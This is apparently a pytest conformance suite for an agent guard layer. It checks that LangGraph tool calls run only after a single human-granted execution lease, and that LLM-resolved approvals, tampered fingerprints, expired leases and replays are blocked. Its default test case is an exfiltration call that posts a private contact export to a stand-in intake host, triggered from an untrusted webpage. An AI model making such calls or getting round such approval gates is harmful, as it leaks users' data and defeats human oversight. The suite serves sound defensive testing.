"""LangGraph RTE-05 CF-13..CF-17 runtime conformance evidence."""

from __future__ import annotations

import asyncio
import json
import os
from dataclasses import dataclass, field
from typing import Any, Callable, Literal

import httpx
import pytest
from agentguard_core import AuditEvent, GuardEvent
from fastapi.responses import Response
from pydantic import BaseModel

from agentguard_langgraph_adapter.config import AgentGuardLangGraphConfig
from agentguard_langgraph_adapter.langgraph_adapter import LangGraphAdapter
from agentguard_langgraph_adapter.tool_gateway import (
    GuardedToolGateway as SdkGuardedToolGateway,
)
from agentguard_langgraph_bench.bench.runtime.tool_gateway import (
    GuardedToolGateway as BenchGuardedToolGateway,
)
from guard_api.auth import ApiAuthError
from guard_api.errors import error_response
from guard_api.main import create_app
from guard_api.models import ExecutionLeaseConsumeRequest
from guard_api.storage.postgres import PostgresControlPlaneStore
from tests.support.postgres import get_test_database_url, reset_control_plane_schema
from tests.test_rte05_execution_lease_api import (
    ADAPTER_TOKEN,
    TASK_ID,
    _service_rig,
    _strong_settings,
)

RUNTIME_BINDING_ID = "binding:cred_adapter_main"
LEASE_TOKEN_MARKER = "lease-v1:"

# Registry evidence anchors: CF-13 exact lease/correlation, CF-14 TOCTOU,
# CF-15 replay/expiry, CF-16 LLM isolation. CF-17 is explicitly NOT_SUPPORTED.


def _selected_backends() -> list[str]:
    selected = os.getenv("AGENTGUARD_RTE05_STORAGE_BACKEND", "").strip().lower()
    if not selected:
        return ["memory", "postgres"]
    if selected not in {"memory", "postgres"}:
        raise RuntimeError(
            "AGENTGUARD_RTE05_STORAGE_BACKEND must be memory or postgres"
        )
    return [selected]


@pytest.fixture(params=_selected_backends())
def rte05_rig(request: pytest.FixtureRequest):
    backend = str(request.param)
    if backend == "memory":
        yield backend, _service_rig()
        return

    database_url = get_test_database_url()
    reset_control_plane_schema(database_url)
    store = PostgresControlPlaneStore(database_url)
    store.initialize()
    try:
        yield (
            backend,
            _service_rig(
                store=store,
                settings=_strong_settings(
                    storage_backend="postgres",
                    database_url=database_url,
                ),
            ),
        )
    finally:
        reset_control_plane_schema(database_url)


class _CountingRuntime:
    def __init__(self) -> None:
        self.calls: list[tuple[str, dict[str, Any]]] = []

    def snapshot(self) -> list[tuple[str, dict[str, Any]]]:
        return list(self.calls)

    def invoke(self, tool_name: str, arguments: dict[str, Any]) -> dict[str, Any]:
        self.calls.append((tool_name, dict(arguments)))
        return {"ok": True, "invocation_count": len(self.calls)}

    def diff(self, before: list[tuple[str, dict[str, Any]]]) -> list[dict[str, Any]]:
        return [{"type": "runtime_invocation", "count": len(self.calls) - len(before)}]


@dataclass
class _AppBridge:
    app: Any
    rig: Any
    resolution_source: Literal["human", "llm"] = "human"
    consume_mode: Literal["exact", "drift", "expired", "ambiguous_replay"] = "exact"
    consume_count: int = 0
    request_bodies: list[bytes] | None = None
    consume_response_payloads: list[dict[str, Any]] | None = None
    wait_hook: Callable[[], None] | None = None
    _evaluate_endpoint: Any = field(init=False, repr=False)
    _wait_endpoint: Any = field(init=False, repr=False)
    _consume_endpoint: Any = field(init=False, repr=False)
    _audit_endpoint: Any = field(init=False, repr=False)

    def __post_init__(self) -> None:
        self.request_bodies = []
        self.consume_response_payloads = []
        self._evaluate_endpoint = _route_endpoint(
            self.app, "/v1/guard/evaluate", "POST"
        )
        self._wait_endpoint = _route_endpoint(
            self.app, "/v1/approvals/{approval_id}/wait", "GET"
        )
        self._consume_endpoint = _route_endpoint(
            self.app,
            "/v1/approvals/{approval_id}/execution-leases/consume",
            "POST",
        )
        self._audit_endpoint = _route_endpoint(self.app, "/v1/audit/events", "POST")

    def client_type(self):
        bridge = self

        class AppClient:
            def __init__(self, *args: Any, **kwargs: Any) -> None:
                pass

            def __enter__(self) -> "AppClient":
                return self

            def __exit__(self, *args: Any) -> None:
                return None

            def get(
                self, url: str, *, headers: dict[str, str] | None = None
            ) -> httpx.Response:
                return bridge.dispatch(httpx.Request("GET", url, headers=headers))

            def post(
                self,
                url: str,
                *,
                headers: dict[str, str] | None = None,
                json: dict[str, Any] | None = None,
                content: bytes | None = None,
            ) -> httpx.Response:
                if content is None:
                    content = (
                        __import__("json").dumps(json).encode("utf-8")
                        if json is not None
                        else b""
                    )
                return bridge.dispatch(
                    httpx.Request("POST", url, headers=headers, content=content)
                )

        return AppClient

    def dispatch(self, request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if path.endswith("/wait"):
            if self.wait_hook is not None:
                hook, self.wait_hook = self.wait_hook, None
                hook()
            approval_id = path.split("/")[-2]
            approval = self.rig.store.get_approval(approval_id)
            if approval is not None and approval.status == "pending":
                self.rig.approvals.resolve_approval(
                    approval_id,
                    "allow_once",
                    resolution_source=self.resolution_source,
                )
        if path.endswith("/execution-leases/consume"):
            self.consume_count += 1
            assert self.request_bodies is not None
            self.request_bodies.append(request.content)
            if self.consume_mode == "expired":
                return httpx.Response(
                    410,
                    json={"error": {"code": "EXECUTION_LEASE_EXPIRED"}},
                    request=request,
                )
            if self.consume_mode == "drift":
                payload = json.loads(request.content)
                fingerprint = str(payload["authorization_fingerprint"])
                payload["authorization_fingerprint"] = fingerprint[:-1] + (
                    "0" if fingerprint[-1] != "0" else "1"
                )
                request = httpx.Request(
                    request.method,
                    request.url,
                    headers=request.headers,
                    content=json.dumps(
                        payload, sort_keys=True, separators=(",", ":")
                    ).encode("utf-8"),
                )
            if self.consume_mode == "ambiguous_replay" and self.consume_count == 1:
                response = self._dispatch_route(request)
                assert response.status_code == 200
                assert self.consume_response_payloads is not None
                self.consume_response_payloads.append(response.json())
                raise httpx.ReadError(
                    "execution lease response lost after server commit",
                    request=request,
                )
        response = self._dispatch_route(request)
        if path.endswith("/execution-leases/consume") and response.is_success:
            assert self.consume_response_payloads is not None
            self.consume_response_payloads.append(response.json())
        return response

    def _dispatch_route(self, request: httpx.Request) -> httpx.Response:
        path = request.url.path
        authorization = request.headers.get("authorization")
        try:
            if request.method == "POST" and path == "/v1/guard/evaluate":
                result = self._evaluate_endpoint(
                    payload=GuardEvent.model_validate_json(request.content),
                    authorization=authorization,
                )
            elif request.method == "GET" and path.endswith("/wait"):
                result = self._wait_endpoint(
                    approval_id=path.split("/")[-2],
                    authorization=authorization,
                )
            elif request.method == "POST" and path.endswith(
                "/execution-leases/consume"
            ):
                result = self._consume_endpoint(
                    approval_id=path.split("/")[-3],
                    payload=ExecutionLeaseConsumeRequest.model_validate_json(
                        request.content
                    ),
                    authorization=authorization,
                )
            elif request.method == "POST" and path == "/v1/audit/events":
                raw_payload = json.loads(request.content)
                result = asyncio.run(
                    self._audit_endpoint(
                        payload=AuditEvent.model_validate(raw_payload),
                        request=_JsonRequest(raw_payload),
                        authorization=authorization,
                    )
                )
            else:
                raise AssertionError(f"unexpected request: {request.method} {path}")
        except ApiAuthError as exc:
            rendered = error_response(exc.code, status_code=exc.status_code)
            return httpx.Response(
                rendered.status_code,
                content=rendered.body,
                headers={"content-type": "application/json"},
                request=request,
            )

        if isinstance(result, Response):
            return httpx.Response(
                result.status_code,
                content=result.body,
                headers=dict(result.headers),
                request=request,
            )
        if isinstance(result, BaseModel):
            result = result.model_dump(mode="json")
        return httpx.Response(200, json=result, request=request)


@dataclass(frozen=True)
class _JsonRequest:
    payload: dict[str, Any]

    async def json(self) -> dict[str, Any]:
        return self.payload


def _route_endpoint(app: Any, path: str, method: str) -> Any:
    for route in app.routes:
        if getattr(route, "path", None) == path and method in getattr(
            route, "methods", set()
        ):
            return route.endpoint
    raise AssertionError(f"route missing: {method} {path}")


def _runtime_adapter() -> LangGraphAdapter:
    return LangGraphAdapter(
        config=AgentGuardLangGraphConfig(
            core_base_url="http://127.0.0.1:8088",
            token=ADAPTER_TOKEN,
            timeout=0.5,
            runtime="langgraph",
            agent_id="main",
            runtime_binding_id=RUNTIME_BINDING_ID,
        )
    )


def _invoke(
    *,
    gateway_kind: Literal["sdk", "bench"],
    runtime: _CountingRuntime,
    backend: str,
    arguments: dict[str, Any] | None = None,
) -> Any:
    adapter = _runtime_adapter()
    if gateway_kind == "sdk":
        gateway = SdkGuardedToolGateway(
            adapter,
            runtime,
            approval_timeout=1.0,
            approval_poll_interval=0.001,
        )
    else:
        gateway = BenchGuardedToolGateway(
            adapter,
            runtime,
            approval_mode="wait",
            approval_timeout=1.0,
        )
    return gateway.invoke_tool(
        # Use a single-layer outbound API action here. ``send_email`` now has
        # both the generic tool-call checkpoint and S2's semantic message-send
        # checkpoint; two independently bound approvals must fail closed as a
        # multiple-binding conflict rather than being presented as CF-13.
        tool_name="call_api",
        arguments=arguments
        or {
            "url": "https://exfiltration-intake.invalid/collect/contacts",
            "method": "POST",
            "body": "private contact export",
        },
        security={
            "user_task": "Complete the visible web form only",
            "source_type": "webpage",
            "source_trust": "untrusted",
            "agent_id": "main",
            "case_id": f"RTE-05-{backend}",
            "metadata": {"task_id": TASK_ID},
        },
        trace_id=f"trace_rte05_{gateway_kind}_{backend}",
        call_id=f"call_rte05_{gateway_kind}_{backend}",
    )


def _audit_payloads(store: Any) -> list[dict[str, Any]]:
    return [item.model_dump(mode="json") for item in store.list_audit_events()]


def _lease_authority_ids(store: Any) -> tuple[list[str], list[str]]:
    if hasattr(store, "grant_consumption_records"):
        consumption_ids = sorted(store.grant_consumption_records)
        lease_ids = sorted(store.execution_lease_records)
        return consumption_ids, lease_ids

    from sqlalchemy import select

    from guard_api.storage.postgres import execution_leases, grant_consumptions

    with store._read_session() as session:  # pyright: ignore[reportPrivateUsage]
        consumption_ids = sorted(
            str(value)
            for value in session.execute(
                select(grant_consumptions.c.consumption_id)
            ).scalars()
        )
        lease_ids = sorted(
            str(value)
            for value in session.execute(select(execution_leases.c.lease_id)).scalars()
        )
    return consumption_ids, lease_ids


@pytest.mark.parametrize("gateway_kind", ["sdk", "bench"])
def test_cf13_exact_human_lease_precedes_single_invocation_and_correlates_receipts(
    rte05_rig: tuple[str, Any],
    gateway_kind: Literal["sdk", "bench"],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    backend, rig = rte05_rig
    app = create_app(store=rig.store, settings=rig.settings)
    bridge = _AppBridge(app, rig)
    monkeypatch.setattr(httpx, "Client", bridge.client_type())
    runtime = _CountingRuntime()

    result = _invoke(gateway_kind=gateway_kind, runtime=runtime, backend=backend)

    assert bridge.consume_count == 1
    assert len(runtime.calls) == 1
    assert result.executed is True and result.blocked is False
    assert result.lease_id and result.consumption_id
    audits = _audit_payloads(rig.store)
    action_receipts = [
        item
        for item in audits
        if item["event_type"] in {"tool_call_started", "runtime_outcome"}
        and item.get("links", {}).get("lease_id") == result.lease_id
    ]
    assert len(action_receipts) == 2
    assert {
        (item["links"]["lease_id"], item["links"]["consumption_id"])
        for item in action_receipts
    } == {(result.lease_id, result.consumption_id)}
    terminal = [
        item for item in action_receipts if item["event_type"] == "runtime_outcome"
    ][0]
    assert terminal["evidence"]["execution"]["status"] == "executed"
    assert terminal["evidence"]["enforcement"]["lease_consume_outcome"] == "consumed"
    private_binding = rig.store.get_enforcement_binding(result.approval_id)
    assert private_binding is not None
    public_evidence = json.dumps(
        {"result": result.model_dump(mode="json"), "audits": audits},
        sort_keys=True,
    )
    assert private_binding.authorization_fingerprint not in public_evidence
    assert LEASE_TOKEN_MARKER not in public_evidence


def test_cf15_ambiguous_first_consume_response_replays_once_and_invokes_once(
    rte05_rig: tuple[str, Any],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    backend, rig = rte05_rig
    app = create_app(store=rig.store, settings=rig.settings)
    bridge = _AppBridge(app, rig, consume_mode="ambiguous_replay")
    monkeypatch.setattr(httpx, "Client", bridge.client_type())
    runtime = _CountingRuntime()

    result = _invoke(gateway_kind="sdk", runtime=runtime, backend=backend)

    assert bridge.consume_count == 2
    assert bridge.request_bodies is not None
    assert len(bridge.request_bodies) == 2
    assert bridge.request_bodies[0] == bridge.request_bodies[1]
    assert bridge.consume_response_payloads is not None
    assert len(bridge.consume_response_payloads) == 2
    assert bridge.consume_response_payloads[0] == bridge.consume_response_payloads[1]
    assert len(runtime.calls) == 1
    assert result.executed is True and result.blocked is False
    consumption_ids, lease_ids = _lease_authority_ids(rig.store)
    assert consumption_ids == [result.consumption_id]
    assert lease_ids == [result.lease_id]
    assert (
        bridge.consume_response_payloads[0]["consumption_id"] == result.consumption_id
    )
    assert bridge.consume_response_payloads[0]["lease_id"] == result.lease_id


@pytest.mark.parametrize(
    ("consume_mode", "reason_code"),
    [
        pytest.param("drift", "rte-05:consumption_conflict", id="CF-14-toctou"),
        pytest.param("expired", "rte-05:lease_expired", id="CF-15-expiry"),
    ],
)
def test_cf14_cf15_conflict_or_expiry_is_not_retried_and_never_invokes(
    rte05_rig: tuple[str, Any],
    consume_mode: Literal["drift", "expired"],
    reason_code: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    backend, rig = rte05_rig
    app = create_app(store=rig.store, settings=rig.settings)
    bridge = _AppBridge(app, rig, consume_mode=consume_mode)
    monkeypatch.setattr(httpx, "Client", bridge.client_type())
    runtime = _CountingRuntime()

    result = _invoke(gateway_kind="sdk", runtime=runtime, backend=backend)

    assert bridge.consume_count == 1
    assert runtime.calls == []
    assert result.executed is False and result.blocked is True
    terminal = [
        item
        for item in _audit_payloads(rig.store)
        if item["event_type"] == "runtime_outcome"
    ][-1]
    assert terminal["evidence"]["execution"]["status"] == "not_invoked"
    assert terminal["evidence"]["enforcement"]["gate_state"] == "binding_failed"
    assert reason_code in terminal["evidence"]["enforcement"]["reason_codes"]


def test_cf16_llm_allow_once_never_reaches_consume_or_invocation(
    rte05_rig: tuple[str, Any],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    backend, rig = rte05_rig
    app = create_app(store=rig.store, settings=rig.settings)
    bridge = _AppBridge(app, rig, resolution_source="llm")
    monkeypatch.setattr(httpx, "Client", bridge.client_type())
    runtime = _CountingRuntime()

    result = _invoke(gateway_kind="bench", runtime=runtime, backend=backend)

    assert bridge.consume_count == 0
    assert runtime.calls == []
    assert result.executed is False and result.blocked is True
    terminal = [
        item
        for item in _audit_payloads(rig.store)
        if item["event_type"] == "runtime_outcome"
    ][-1]
    assert terminal["evidence"]["execution"]["status"] == "not_invoked"
    assert (
        "rte-05:approval_not_human"
        in terminal["evidence"]["enforcement"]["reason_codes"]
    )


def test_cf17_langgraph_active_correlation_capacity_is_not_supported() -> None:
    """LangGraph's synchronous wrapper has no bounded active-call cache to evict."""

    assert not hasattr(SdkGuardedToolGateway, "active_calls")
    assert not hasattr(BenchGuardedToolGateway, "active_calls")
